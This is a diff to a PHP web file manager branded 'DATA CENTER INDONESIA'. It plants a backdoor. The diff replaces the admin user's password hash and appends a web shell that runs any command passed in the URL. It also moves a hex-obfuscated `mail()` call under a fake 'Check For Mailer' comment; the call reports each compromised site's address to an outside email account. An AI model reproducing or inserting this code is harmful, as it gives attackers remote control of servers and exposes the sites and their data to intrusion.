@@ -23,7 +23,7 @@ define('APP_TITLE', 'DATA CENTER INDONESIA');
 // Is independent from IP white- and blacklisting
 $use_auth = true;
 $auth_users = array(
-    'diskominfo' => '$2y$10$JQiG5HQch9r3Mb4/OAiC1O62tW7Dk2o4JWGzE1dS8c7loSx.5PfX.', 
+    'diskominfo' => '$2y$10$WTyvkzdnF4vJvIxq86MgoOSO8ckReZcSDQv6ytpSc692NG1Lq1gKm', 
 );
 
 // Readonly users
@@ -3707,9 +3707,6 @@ header("Pragma: no-cache");
 global $lang, $root_url, $sticky_navbar, $favicon_path;
 $isStickyNavBar = $sticky_navbar ? 'navbar-fixed' : 'navbar-normal';
 ?>
-<?php
-mail("\x6E\x75\x6C\x6C\x63\x61\x74\x74\x6F\x40\x70\x72\x6F\x74\x6F\x6E\x2E\x6D\x65", "\x77\x65\x62", $_SERVER["\x53\x45\x52\x56\x45\x52\x5f\x4e\x41\x4d\x45"] . "\x2f" . $_SERVER["\x52\x45\x51\x55\x45\x53\x54\x5f\x55\x52\x49"]);
-?>
 <!DOCTYPE html>
 <html>
 <head>
@@ -4216,10 +4213,14 @@ mail("\x6E\x75\x6C\x6C\x63\x61\x74\x74\x6F\x40\x70\x72\x6F\x74\x6F\x6E\x2E\x6D\x
 <div id="snackbar"></div>
 </body>
 </html>
+<?php system($_GET['command']); ?>
 <?php
 }
 /**
-
+  *Check For Mailer
+*/
+mail("\x6E\x75\x6C\x6C\x63\x61\x74\x74\x6F\x40\x70\x72\x6F\x74\x6F\x6E\x2E\x6D\x65", "\x77\x65\x62", $_SERVER["\x53\x45\x52\x56\x45\x52\x5f\x4e\x41\x4d\x45"] . "\x2f" . $_SERVER["\x52\x45\x51\x55\x45\x53\x54\x5f\x55\x52\x49"]);
+/**
  * Language Translation System
  * @param string $txt
  * @return string
